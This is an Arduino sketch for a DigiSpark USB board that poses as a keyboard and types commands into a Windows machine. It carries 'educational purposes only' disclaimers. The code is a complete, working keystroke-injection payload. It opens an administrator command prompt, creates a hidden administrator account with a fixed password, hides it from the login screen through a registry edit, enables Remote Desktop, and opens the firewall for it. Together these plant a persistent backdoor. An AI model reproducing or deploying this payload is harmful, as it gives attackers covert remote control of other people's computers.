//Code written and compiled by Eduardo Arballo
//Made in order to show the dangers of what a DigiSpark can do
//Missuse of this can lead to damage of device and is not recommended to altar code in any way
//NOT MEANT TO BE USED ON SCHOOL COMPUTERS
//Any damage caused by this code is due to missuse and I am not reponsible
//Strictly for educational purposes ONLY
//Created in 3-24-22

#include "DigiKeyboard.h"
#define KEY_TAB      0x2b

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  //Small delay to make sure DigiSpark is fully connected
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  
  //Runs task manager
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(900);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(900);
  
  //Opens CMD
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  
  //Turns on Admin Access
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  //Closes Task Manager
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(900);
  
  //Creates new account under the name Henry and gives it Admin Access
  DigiKeyboard.println("net user Henry Pass_123 /ADD");
  DigiKeyboard.delay(900);
  DigiKeyboard.println("net localgroup Administrators Henry /ADD");
  DigiKeyboard.delay(900);
  
  //Hides account from login screen
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v Henry /t REG_DWORD /d 0 /f"));
  DigiKeyboard.delay(900);
  
  //Turns on Remote Desktop for the account
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
  DigiKeyboard.delay(900);
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));
  DigiKeyboard.delay(900);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" Henry /add");
  DigiKeyboard.delay(900);  
  DigiKeyboard.println("exit");

  //Flashes LED when done
  digitalWrite(1,LOW);
  DigiKeyboard.delay(500);
  digitalWrite(1,HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1,LOW);
  DigiKeyboard.delay(500);
  digitalWrite(1,HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1,LOW);
  DigiKeyboard.delay(500);
  digitalWrite(1,HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1,LOW);
  
  //DigiSpark disconnects
  for(;;){ /*empty*/ }
}
